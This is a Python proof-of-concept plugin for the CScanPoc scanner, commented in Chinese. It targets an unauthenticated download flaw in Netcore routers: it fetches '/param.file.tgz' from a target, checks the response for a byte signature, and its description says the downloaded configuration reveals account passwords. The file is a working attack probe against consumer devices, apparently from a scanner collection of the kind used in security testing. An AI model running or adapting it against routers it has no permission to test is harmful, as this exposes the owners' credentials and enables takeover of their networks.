# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Netcore_0001'  # 平台漏洞编号，留空
    name = '磊科路由器 未授权访问'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
         磊科（Netcore）路由器未授权访问，下载配置文件查看密码。
         hex可以看到账号密码，等信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '磊科路由器'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '27c98273-1d8e-4b08-b8d5-692722a4cbc0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/param.file.tgz"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)

            if code == 200 and '\x37\x39\x2F\x2A\x74\xEE' in res:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
